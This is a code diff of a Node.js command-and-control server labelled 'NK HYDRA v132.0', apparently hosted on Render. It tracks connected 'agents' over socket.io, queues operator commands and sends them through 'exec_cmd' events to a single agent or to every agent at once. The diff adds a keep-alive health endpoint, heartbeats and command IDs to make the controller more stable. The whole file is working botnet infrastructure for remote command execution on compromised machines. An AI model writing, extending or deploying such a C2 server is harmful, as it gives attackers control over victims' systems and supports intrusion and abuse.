@@ -1,5 +1,5 @@
 // TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
-// NK HYDRA v132.0 [GOD MODE STABLE QUEUE]
+// NK HYDRA v132.0 [GOD MODE - STABLE QUEUE & HEARTBEAT]
 
 const express = require('express');
 const http = require('http');
@@ -18,6 +18,8 @@ process.on('unhandledRejection', (reason, promise) => {
 const app = express();
 app.use(cors());
 
+// Health Check Endpoint for Ping Services (Keep Render Awake)
+app.get('/health', (req, res) => { res.status(200).send('OK'); });
 app.get('/', (req, res) => { 
     res.json({ 
         status: 'online', 
@@ -36,12 +38,10 @@ const io = new Server(server, {
 });
 
 let agents = []; 
-
-// --- COMMAND QUEUE SYSTEM (RENDER STABILITY) ---
-// Prevents server crash when broadcasting 50+ commands instantly
 const commandQueue = [];
 let isProcessingQueue = false;
 
+// --- QUEUE PROCESSOR ---
 const processQueue = async () => {
     if (isProcessingQueue || commandQueue.length === 0) return;
     isProcessingQueue = true;
@@ -50,31 +50,33 @@ const processQueue = async () => {
         const task = commandQueue.shift();
         if (task) {
             try {
-                // Execute Task
                 if (task.targetId === 'all') {
-                    io.emit('exec_cmd', { cmd: task.cmd });
+                    io.emit('exec_cmd', { cmd: task.cmd, id: task.id });
                 } else {
                     const agent = agents.find(a => a.id === task.targetId);
                     if (agent && agent.socketId) {
-                         io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd });
+                         io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd, id: task.id });
                     }
-                }
-                // Log only occasionally to save bandwidth
-                if (Math.random() > 0.8) {
-                    io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `Processing Queue: ${task.cmd}` });
                 }
             } catch (e) {
                 console.error("Queue Exec Error:", e);
             }
         }
-        // Artificial Delay to prevent CPU Spike on Render Free Tier
-        await new Promise(r => setTimeout(r, 150)); 
+        // Throttle to prevent flooding Render
+        await new Promise(r => setTimeout(r, 200)); 
     }
     isProcessingQueue = false;
 };
 
 io.on('connection', (socket) => {
     
+    // --- HEARTBEAT HANDLER ---
+    socket.on('heartbeat', (data) => {
+        // Just update lastSeen, keep socket alive
+        const agent = agents.find(a => a.socketId === socket.id);
+        if (agent) agent.lastSeen = Date.now();
+    });
+
     socket.on('identify', (data) => {
         try {
             if (data.type === 'ui') {
@@ -83,9 +85,7 @@ io.on('connection', (socket) => {
                 return;
             }
 
-            console.log(`[+] Agent Identified: ${data.id}`);
-            
-            // Deduplicate
+            // Remove existing agent with same ID (reconnection)
             agents = agents.filter(a => a.id !== data.id);
             
             agents.push({ 
@@ -96,6 +96,7 @@ io.on('connection', (socket) => {
             });
             
             io.to('ui_room').emit('agents_list', agents);
+            console.log(`[+] Agent Online: ${data.id}`);
         } catch (e) {
             console.error("Identify Error:", e);
         }
@@ -104,18 +105,13 @@ io.on('connection', (socket) => {
     socket.on('exec_cmd', (data) => {
         try {
             const { targetId, cmd } = data;
-            // PUSH TO QUEUE INSTEAD OF EXECUTING IMMEDIATELY
-            commandQueue.push({ targetId, cmd });
-            console.log(`[QUEUE] ${cmd} -> ${targetId} (Size: ${commandQueue.length})`);
+            const id = Date.now().toString(); // Command ID
+            commandQueue.push({ targetId, cmd, id });
             
             io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `Queued: ${cmd}` });
-            
-            // Trigger processing
             processQueue();
 
-        } catch (e) {
-            console.error("Exec Error:", e);
-        }
+        } catch (e) { console.error("Exec Error:", e); }
     });
     
     socket.on('agent_event', (data) => {
@@ -135,4 +131,3 @@ io.on('connection', (socket) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`HYDRA v132 LISTENING ON ${PORT}`));
-
